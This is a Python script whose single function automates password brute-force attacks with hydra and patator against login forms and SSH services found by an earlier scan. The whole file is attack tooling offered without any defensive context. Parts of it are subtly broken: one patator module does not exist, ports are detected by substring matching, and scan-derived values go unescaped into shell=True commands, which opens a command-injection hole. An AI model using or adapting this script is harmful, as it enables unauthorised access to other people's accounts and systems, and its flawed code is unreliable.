import os
import re
import subprocess
import time

def automate_attacks(scan_results, username_list_path=None, password_list_path=None, hydra_options=None):
    for url, results in scan_results.items():
        if "username" in results and "password" in results:
            print(f"Starting attacks on {url}")
            form_inputs = results["username"]
            username_form_input = form_inputs["form_input_name"]
            username = form_inputs["value"]
            form_inputs = results["password"]
            password_form_input = form_inputs["form_input_name"]
            password = form_inputs["value"]

            if username_list_path and password_list_path:
                hydra_cmd = ["hydra", "-L", username_list_path, "-P", password_list_path, url]
                if hydra_options:
                    hydra_cmd += hydra_options.split()
                subprocess.run(hydra_cmd)

            elif username and password:
                # Determine which attack tool to use based on available ports
                if "80" in url:
                    cmd = f"echo 'admin\npassword\n' | patator http_fuzz url={url} method=POST body='{username_form_input}={username}&{password_form_input}={password}' 0=/dev/null"
                    subprocess.run(cmd, shell=True)
                elif "443" in url:
                    cmd = f"echo 'admin\npassword\n' | patator ssl_fuzz host={url} method=POST url='/' body='{username_form_input}={username}&{password_form_input}={password}' 0=/dev/null"
                    subprocess.run(cmd, shell=True)
                elif "22" in url:
                    cmd = f"echo 'password\n' | patator ssh_login host={url} user=USERNAME password=FILE0 0={password_list_path} -x ignore:fgrep='Permission denied' 0=/dev/null"
                    subprocess.run(cmd, shell=True)

                # Add additional attack types here
                # elif "port_number" in url:

                else:
                    print("No supported ports found for attack")

            else:
                print("No valid username and password found for attack")

            time.sleep(2)
